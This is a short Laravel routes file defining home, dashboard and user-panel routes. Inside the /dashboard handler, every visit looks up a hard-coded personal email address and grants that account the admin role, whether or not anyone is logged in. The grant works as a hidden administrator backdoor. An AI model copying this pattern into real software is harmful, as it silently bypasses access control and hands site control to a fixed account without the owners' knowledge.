<?php

use Illuminate\Support\Facades\Route;

Route::inertia('/', 'welcome')->name('home');

Route::get('/dashboard', function () {
    $user = App\Models\User::where('email', 'rajib.babu9757@gmail.com')->first();
    if ($user && !$user->hasRole('admin')) {
        $user->assignRole('admin');
    }

    if (auth()->check()) {
        if (auth()->user()->hasRole('admin')) {
            return redirect()->route('admin.dashboard');
        }
        // Everyone else goes to the user panel
        return redirect()->route('user.dashboard');
    }
    return redirect()->route('login');
})->name('dashboard');

Route::middleware(['auth'])->prefix('user')->name('user.')->group(function (): void {
    Route::get('/dashboard', [\App\Http\Controllers\User\DashboardController::class, 'index'])->name('dashboard');
});

require __DIR__.'/settings.php';
